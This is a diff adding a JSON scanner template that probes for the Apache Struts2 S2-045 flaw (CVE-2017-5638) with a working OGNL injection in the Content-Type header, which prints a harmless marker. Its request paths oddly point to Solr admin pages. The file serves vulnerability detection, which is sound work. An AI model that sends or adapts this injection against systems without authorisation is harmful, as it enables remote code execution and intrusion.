@@ -1,0 +1,38 @@
+{
+    "id" : "00007",
+    "name" : "Apache_Struts2_S2-045-CVE-2017-5638",
+    "desc" : "apps=Java&body=\\.do|\\.action",
+    "author" : "",
+    "version" : "1.0",
+    "references" : [],
+    "request" : {
+        "protocols" : ["http", "https"],
+        "method" : "GET",
+        "ports" : [80, 8080],
+        "suffixes" : [
+            "/solr/admin/info/system?wt=json",
+            "/admin/info/system?wt=json"
+        ],
+        "user-agent" : "",
+        "headers" : {
+            "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('biu'+'framework')).(#o.close())}"
+        },
+        "auth" : {
+            "username" : "",
+            "password" : ""
+        },
+        "queryset": [],
+        "bodys" : [],
+        "json" : null
+    },
+    "matcher" : {
+        "status" : [],
+        "texts" : [
+            {
+                "type" : "icontains",
+                "value" : "biuframework"
+            }
+        ],
+        "headers" : []
+    }
+}
